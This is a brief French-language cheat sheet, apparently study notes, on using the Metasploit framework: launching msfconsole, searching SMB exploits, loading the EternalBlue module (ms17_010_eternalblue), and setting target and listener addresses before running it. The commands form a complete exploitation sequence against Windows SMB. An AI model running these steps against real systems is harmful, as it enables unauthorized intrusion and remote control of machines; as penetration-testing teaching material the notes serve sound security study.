# Metasploit – Framework d’exploitation

## 🎯 Objectif
Exploiter des vulnérabilités connues.

## 🔧 Lancer
msfconsole

## 🔎 Rechercher exploit
search smb

## 🔧 Utiliser module
use exploit/windows/smb/ms17_010_eternalblue

## ⚙️ Configurer
set RHOSTS 192.168.1.10
set LHOST 192.168.1.20
run

## 📌 Contient
Exploits, payloads, post-exploitation.